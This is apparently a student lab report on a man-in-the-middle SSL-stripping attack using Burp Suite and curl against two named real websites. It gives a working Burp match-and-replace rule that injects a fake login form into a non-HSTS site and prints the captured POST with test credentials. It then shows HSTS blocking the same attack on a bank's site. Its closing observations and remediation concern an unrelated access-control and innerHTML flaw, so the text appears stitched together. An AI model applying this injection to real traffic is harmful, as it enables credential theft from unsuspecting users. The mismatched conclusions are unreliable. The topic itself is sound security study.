# MiTM 1 Vulnerabilities

In this report i simulate a Men in the middle attack

## Tools

- BURP suite
- Curl

## Positive Execution of the attack

> **Description**: Find a website that don't use HSTS, try to be between the victime and the website

### Preliminary steps

1. Find a target website (<https://www.piscinadisangiovanni.com/>)

### Discovery

1. With Curl check if the website redirect the http requests
2. In the same comand check if present if there is HSTS

``` script
curl -I http://www.piscinadisangiovanni.com/

HTTP/1.1 301 Moved Permanently
Date: Fri, 19 Jun 2026 15:35:00 GMT
Server: Apache
Location: https://www.piscinadisangiovanni.com/
Cache-Control: max-age=172800
Expires: Sun, 21 Jun 2026 15:35:00 GMT
Content-Type: text/html; charset=iso-8859-1
```

> It's possible to use this website for doing a MiTM attack

### Exploitation

1. Force Burp to use TLS
2. Enable Remove secure flags from cookies
3. Enable Convert HTTPS links to HTTP
4. In proxy under match and replace add this rule:
   1. Type: Response body
   2. Match: Una struttura polivalente e perfetta per fare sport!
   3. Replace :  <form action="#" method="post">   <div class="form-group">     <label for="exampleInputEmail1">Email address</label>     <input type="email" class="form-control" id="exampleInputEmail1" aria-describedby="emailHelp" name="uname">     <small id="emailHelp" class="form-text text-muted">Non condivideremo le tue credenziali con altri.</small>   </div>   <div class="form-group">     <label for="exampleInputPassword1">Password</label>     <input type="password" class="form-control" id="exampleInputPassword1" name="psw">   </div>   <div class="form-group form-check">     <input type="checkbox" class="form-check-input" id="exampleCheck1">     <label class="form-check-label" for="exampleCheck1">Check me out</label>   </div>   <button type="submit" class="btn btn-primary">Submit</button> </form> 
5. Now from the attacker point of view there is this web site
6. ![alt text](img/image.png)
7. If the user write the from and press submit
8. In the proxy we can see the username and password used for the login
9. POST / HTTP/1.1
Host: www.piscinadisangiovanni.com
Content-Length: 37
Cache-Control: max-age=0
Accept-Language: en-GB,en;q=0.9
Origin: http://www.piscinadisangiovanni.com
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://www.piscinadisangiovanni.com/
Accept-Encoding: gzip, deflate, br
Connection: keep-alive

uname=test%40gmail.com&psw=securesite

> **Observation:** With this method it's possible to run even scripts

## Challenge #2. Negative Execution of the attack

> **Description**: Try the mitm attack with a website that use HSTS

### Preliminary steps

1. Burp Suite
2. Curl

### Discovery

1. With Curl check if the website redirect the http requests
2. In the same comand check if present if there is HSTS

``` script
curl -I https://www.credem.it/

HTTP/2 200 
date: Fri, 19 Jun 2026 15:45:29 GMT
vary: Host,Accept-Encoding
x-content-type-options: nosniff
x-xss-protection: 1; mode=block
strict-transport-security: max-age=31536000; includeSubDomains; preload
```

> with this website should be impossible to be mitm

### Exploitation

1. Force Burp to use TLS
2. Enable Remove secure flags from cookies
3. Enable Convert HTTPS links to HTTP


> **Observation:** The victim does not need to be logged in for the attack to succeed.
> **Observation:** This indicates the application does not properly restrict which users can view other users' delivery information.

### Remediation (brief)

- Validate and sanitize input on both client and server sides.
- Do not insert untrusted data using `innerHTML` or similar APIs; use safe text APIs or proper output encoding.
- Implement authorization checks to ensure users can only access their own order information.
